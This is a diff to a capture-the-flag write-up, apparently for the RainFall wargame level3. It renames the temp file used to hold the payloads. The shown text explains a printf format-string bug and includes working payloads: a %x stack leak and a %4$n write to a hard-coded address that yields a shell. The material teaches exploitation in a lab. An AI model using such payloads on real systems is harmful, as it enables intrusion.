@@ -60,8 +60,8 @@ printf(str); // bad code
 ```
 If we put the argument like ```"%x %x"```, printf will be pop the stack and show us.
 ```sh
-level3@RainFall:~$ python -c 'print "BBBB %x %x %x %x %x %x %x"' > /tmp/exploit2
-level3@RainFall:~$ cat /tmp/exploit2 | ./level3
+level3@RainFall:~$ python -c 'print "BBBB %x %x %x %x %x %x %x"' > /tmp/exploit3
+level3@RainFall:~$ cat /tmp/exploit3 | ./level3
 BBBB 200 b7fd1ac0 b7ff37d0 42424242 20782520 25207825 78252078
 ```
 So we can guess our standard input is saved in 4th position of stack. \
@@ -81,8 +81,8 @@ buffer hello: world
 So we can put specific number in the address with ```%n```, 4$ mean 4th stack address. \
 First, put variable ```m``` address, so it will be seated in 4th stack and add 60 bytes of "some value" (a * 60), and write the number of bytes printed by printf (%n) which is ```address(4 bytes) + some value(60 bytes) = 64``` in the 4th (4$) address of stack, where variable ```m``` is located.
 ```sh
-level3@RainFall:~$ python -c 'print "\x8c\x98\x04\x08" + "a" * 60 + "%4$n"' > /tmp/exploit2
-level3@RainFall:~$ cat /tmp/exploit2 - | ./level3
+level3@RainFall:~$ python -c 'print "\x8c\x98\x04\x08" + "a" * 60 + "%4$n"' > /tmp/exploit3
+level3@RainFall:~$ cat /tmp/exploit3 - | ./level3
 �aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
 Wait what?!
 whoami
